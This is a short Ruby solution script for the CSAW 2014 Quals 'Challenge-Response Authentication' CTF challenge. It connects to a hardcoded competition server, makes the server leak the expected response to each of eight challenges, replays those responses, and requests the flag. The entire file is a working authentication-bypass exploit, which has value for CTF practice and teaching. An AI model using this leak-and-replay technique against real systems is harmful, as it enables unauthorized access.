require 'socket'
# require 'pry'

puts "CSAW 2014 Quals - Solution from Jeffrey Crowell"
puts "Challenge-Response Authentication Challenge"
s = TCPSocket.open("54.88.6.254", 8888)
# we need to leak the responses
getchall = 0xA8
sendresp = 0xE0
puts s.recv(1024)
8.times{|i|
  puts "Getting Challenge #{i}'s response"
  s.write(getchall.chr.force_encoding('UTF-8'))
  m = s.recv(1024)
  munpack = m.unpack("V")[0]
  puts "[!] Response for challenge #{i} is 0x#{munpack.to_s(16)} Sending :-)"
  l = (sendresp.chr.force_encoding('UTF-8')) + [munpack].pack("V").force_encoding('UTF-8')
  s.write(l)
  getchall = getchall + 1
  sendresp = sendresp + 1
}
puts "[!] Getting flag!"
s.write("\x80".force_encoding('UTF-8'))
puts s.recv(1024)
